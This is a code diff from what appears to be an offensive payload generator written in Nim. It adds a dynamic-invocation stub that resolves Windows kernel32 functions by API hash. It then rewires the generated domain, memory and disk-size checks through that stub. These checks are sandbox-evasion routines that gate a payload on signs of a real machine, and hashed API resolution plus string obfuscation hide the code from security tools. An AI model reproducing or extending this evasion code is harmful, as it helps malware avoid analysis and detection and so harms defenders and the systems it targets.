@@ -1,6 +1,33 @@
 import strformat
 import strutils
 
+let DInvokeSandBoxStub * = """
+
+
+
+type
+  GetComputerNameExA_t* = proc (nameType: cint, name: cstring, len: PDWORD): WINBOOL {.stdcall.}
+  GlobalMemoryStatusEx_t* = proc (lpBuffer: LPMEMORYSTATUSEX): WINBOOL {.stdcall.}
+  GetDiskFreeSpaceExA_t* = proc (lpDirectoryName: LPCSTR, lpFreeBytesAvailableToCaller: PULARGE_INTEGER, lpTotalNumberOfBytes: PULARGE_INTEGER, lpTotalNumberOfFreeBytes: PULARGE_INTEGER): WINBOOL {.stdcall.}
+
+const
+  GetComputerNameExA_HASH * = 3307371997
+  GlobalMemoryStatusEx_HASH * = 3607992274
+  GetDiskFreeSpaceExA_HASH * = 1454108497
+
+var MyGetComputerNameExA*: GetComputerNameExA_t
+var MyGlobalMemoryStatusEx*: GlobalMemoryStatusEx_t
+var MyGetDiskFreeSpaceExA*: GetDiskFreeSpaceExA_t
+
+MyGetComputerNameExA = cast[GetComputerNameExA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetComputerNameExA_HASH, 0, FALSE)))
+
+MyGlobalMemoryStatusEx = cast[GlobalMemoryStatusEx_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GlobalMemoryStatusEx_HASH, 0, FALSE)))
+
+MyGetDiskFreeSpaceExA = cast[GetDiskFreeSpaceExA_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetDiskFreeSpaceExA_HASH, 0, FALSE))
+
+
+"""
+
 let DomainCheckStub * = """
 
 # code modified from here -> https://github.com/rominf/nim-hostname/blob/d517210adedf7f6c708393ddd20fd7a93504f262/src/hostname.nim
@@ -12,7 +39,7 @@ when defined(windows):
 elif defined(posix):
   import posix
 
-proc getDomain*(): string {.tags: [ReadIOEffect].} =
+proc getDomain*(): string =
   ## Returns domain name only.
   ## On Windows (see
   ## https://docs.microsoft.com/en-us/windows/win32/sysinfo/computer-names)
@@ -23,16 +50,9 @@ proc getDomain*(): string {.tags: [ReadIOEffect].} =
   const size = 256
   result = newString(size)
   when defined(windows):
-    proc getComputerNameExA(nameType: cint, name: cstring, len: PDWORD): WINBOOL
-      {.stdcall, dynlib: "kernel32", importc: "GetComputerNameExA", sideEffect.}
     var resultLen: DWORD = DWORD(size)
-    let success = getComputerNameExA(ComputerNameDnsDomain,
+    let success = MyGetComputerNameExA(ComputerNameDnsDomain,
                                      result.cstring, resultLen.addr) != 0
-  elif defined(posix):
-    let success = getDomain(result, size) == 0
-    let resultLen = len(cstring(result))
-  else:
-    doAssert false, obf("getDomain failed: OS is not supported")
   if not success:
       echo obf("Failed to get Domain")
   result.setLen(resultLen)
@@ -50,7 +70,7 @@ proc MemoryCheck*(): bool =
     var gofurther: bool = false
 
     statex.dwLength = cast[DWORD](sizeof(statex))
-    GlobalMemoryStatusEx(addr statex)
+    discard MyGlobalMemoryStatusEx(addr statex)
     var totalPhys = float(statex.ullTotalPhys) / float(1024*1024*1024)
     # If more than 4GB RAM available return true
     if(totalPhys >= 3.8):
@@ -82,7 +102,7 @@ proc DiskSizeCheck*(): bool =
         result: float
         gofurther: bool
 
-    success = GetDiskFreeSpaceEx("C:\\",addr uliUserFree, addr uliTotal, addr uliRealFree)
+    success = MyGetDiskFreeSpaceExA("C:\\",addr uliUserFree, addr uliTotal, addr uliRealFree)
     result = float(uliTotal.QuadPart) / float((1024*1024*1024))
     #echo "Size in GB: " & $result
     if(result >= 200):
